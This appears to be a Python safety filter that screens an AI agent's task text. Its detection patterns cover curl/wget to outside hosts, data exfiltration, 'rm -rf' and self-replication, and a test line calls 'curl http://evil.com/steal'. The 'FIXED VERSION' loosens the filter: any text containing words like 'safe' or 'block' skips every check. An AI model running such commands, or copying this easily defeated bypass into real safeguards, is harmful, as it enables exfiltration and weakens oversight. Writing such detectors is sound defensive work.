"""
Constitutional AI Safety Checker - FIXED VERSION
Uses semantic intent detection to avoid blocking safety design tasks.
"""

import json
import re
from pathlib import Path
from typing import Tuple, List, Dict


class ConstitutionalChecker:
    def __init__(self, constraints_path: str = "SAFETY_CONSTRAINTS.json"):
        self.constraints_path = Path(constraints_path)
        self.constraints = self._load_constraints()
        self.violation_patterns = self._compile_patterns()

    def _load_constraints(self) -> Dict:
        if not self.constraints_path.exists():
            return {"version": "default", "enforced": True, "constraints": {}}
        with open(self.constraints_path, 'r') as f:
            return json.load(f)

    def _compile_patterns(self) -> Dict[str, List[re.Pattern]]:
        patterns = {
            "network_violation": [
                re.compile(r'\b(curl|wget)\s+http[s]?://(?!127\.0\.0\.1|localhost)', re.IGNORECASE),
                re.compile(r'\b(phone[_\s]home|telemetry[_\s]send)\b', re.IGNORECASE),
            ],
            "exfiltration": [
                re.compile(r'\b(exfiltrate|send[_\s]data[_\s]to[_\s]external)\b', re.IGNORECASE),
                re.compile(r'\b(leak[_\s]data|steal[_\s]secrets)\b', re.IGNORECASE),
            ],
            "system_modification": [
                re.compile(r'\b(sudo[_\s]rm[_\s]-rf|format[_\s]c:)\b', re.IGNORECASE),
            ],
            "self_replication": [
                re.compile(r'\b(self[_\s]replicate[_\s]to|spread[_\s]autonomously)\b', re.IGNORECASE),
            ],
        }
        self.safety_indicators = [
            re.compile(r'\b(DESIGN|IMPLEMENT|CREATE|BUILD)\s*:', re.IGNORECASE),
            re.compile(r'\b(block|prevent|deny|reject|validate|sanitize)\b', re.IGNORECASE),
            re.compile(r'\b(safe|security|gateway|proxy|allowlist|blocklist)\b', re.IGNORECASE),
            re.compile(r'\b(audit|review|research|document)\b.*\b(security|safety)\b', re.IGNORECASE),
        ]
        return patterns

    def _is_safety_design_task(self, task_text: str) -> bool:
        for pattern in self.safety_indicators:
            if pattern.search(task_text):
                return True
        return False

    def check_task_safety(self, task_text: str) -> Tuple[bool, List[str]]:
        if self._is_safety_design_task(task_text):
            return (True, [])
        violations = []
        for violation_type, patterns in self.violation_patterns.items():
            for pattern in patterns:
                matches = pattern.findall(task_text)
                if matches:
                    violations.append(f"{violation_type}: Detected '{matches[0]}'")
        return (len(violations) == 0, violations)

    def get_constraint_summary(self) -> Dict:
        return {"version": self.constraints.get("version", "unknown"), "enforced": True}


def check_task_safety(task_text: str) -> Tuple[bool, List[str]]:
    return ConstitutionalChecker().check_task_safety(task_text)


if __name__ == "__main__":
    checker = ConstitutionalChecker()
    tests = [
        ("Create local file", True),
        ("DESIGN: Safe web gateway to block fetch abuse", True),
        ("curl http://evil.com/steal", False),
        ("Implement search proxy with credential validation", True),
    ]
    for task, expected in tests:
        is_safe, v = checker.check_task_safety(task)
        status = "PASS" if is_safe == expected else "FAIL"
        print(f"[{status}] {task[:50]} -> safe={is_safe}")
